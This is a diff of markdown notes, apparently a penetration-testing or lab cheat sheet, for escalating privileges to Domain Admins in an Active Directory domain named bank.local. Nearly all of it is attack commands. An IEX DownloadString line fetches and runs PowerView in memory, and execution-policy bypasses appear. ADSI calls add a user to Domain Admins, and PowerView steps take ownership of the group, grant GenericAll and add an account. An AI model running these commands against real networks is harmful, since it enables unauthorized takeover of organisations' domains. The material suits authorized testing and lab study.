@@ -71,7 +71,7 @@ IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com
 
 Get-Command -Module PowerView
 
-```
+
 . (If blocked by execution policy, run: Set-ExecutionPolicy Bypass -Scope Process -Force first)
 
 # Verify if 'bb2' has WriteDACL on Domain Admins
@@ -90,12 +90,12 @@ Get-DomainGroupMember -Identity "Domain Admins" | Select-Object MemberName
 ## with permission  - write all properties ✔ is  only enabled
 
 ### if powerview  fails
+```bash
 $Group = [ADSI]"LDAP://CN=Domain Admins,CN=Users,DC=bank,DC=local"
 $Group.Add("LDAP://CN=master,CN=Users,DC=bank,DC=local")
-
----------------------------------------------------------------------------
+```
 ### with permissions - ✔ modify owner is only enabled
-
+```bash
 IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1")
 
 or downloade the script and run by import
@@ -107,11 +107,12 @@ Get-Command Set-DomainObjectOwner, Add-DomainObjectAcl
 
 Set-ExecutionPolicy Bypass -Scope Process -Force
 
-# 1. Take ownership
+- 1. Take ownership
 Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity "usermad" -Verbose
 
-# 2. Grant yourself GenericAll
+- 2. Grant yourself GenericAll
 Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "usermad" -Rights All -Verbose
 
-# 3. Add to group
+- 3. Add to group
 Add-DomainGroupMember -Identity "Domain Admins" -Members "usermad" -Verbose
+```
